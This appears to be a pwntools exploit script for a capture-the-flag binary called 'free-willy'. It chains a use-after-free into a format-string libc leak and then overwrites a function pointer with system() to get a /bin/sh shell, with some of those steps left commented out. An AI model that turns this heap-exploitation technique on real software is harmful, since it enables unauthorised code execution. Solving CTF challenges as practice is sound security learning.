from pwn import *
elf = ELF('./free-willy.patch', checksec=False)
libc = ELF('/opt/glibc/x64/2.28/lib/libc-2.28.so', checksec=False)

def adopt(name):
    p.sendlineafter(b'>', b'adopt')
    p.sendlineafter(b'whale?', b'%s' % name)

def disown(idx):
    p.sendlineafter(b'>', b'disown')
    p.sendlineafter(b'away?', b'%d' % idx)

def rename(idx, name):
    p.sendlineafter(b'>', b'name')
    p.sendlineafter(b'rename?', b'%d' % idx)
    p.sendlineafter(b'name?', b'%s' % name)

def observe(idx, ret=True):
    p.sendlineafter(b'>', b'observe')
    p.sendlineafter(b'observe?', b'%d' % idx)
    if ret:
        return p.recvline_contains('lil').strip().decode('latin-1').split(' ')[-1]
    else:
        p.recvuntil('lil')

if __name__ == '__main__':
    # brute force the fmt string leak
    # with context.local(log_level = 'error'):
    #     for i in range(100):
    #         p = elf.process()
    #         #p =remote('jh2i.com', 50021)
    #         adopt(b'AAAA')
    #         disown(0)
    #         rename(0, p64(elf.sym['whale_view'] + 8))
    #         adopt(p64(elf.plt['printf']))
    #         rename(0, '%{0}$p'.format(i).encode())
    #         observe(0, ret=False)
    #         print(i, p.recvlines(3)[-1])
    #         p.close()
    
    p = elf.process()
    #p = remote('jh2i.com', 50021)

    # use after free -> format string -> leak libc
    adopt(b'AAAA')
    disown(0)
    rename(0, p64(elf.sym['whale_view']))
    #adopt(p64(elf.sym['whale_view']))
    # adopt(p64(elf.plt['printf']))
    # rename(0, b'%13$p')
    # observe(0, ret=False)
    # libc.address = eval(p.recvlines(3)[-1]) - (libc.sym['_IO_fgets'] + 173)
    # log.info('libc base at 0x%x' % libc.address)

    # change the pointer of sym.view_whale_one to system
    # disown(0)
    # rename(0, p64(elf.sym['whale_view'] + 8))
    # adopt(p64(libc.sym['system']))
    # rename(0, b'/bin/sh')
    # observe(0, ret=False) # win
    
    p.interactive()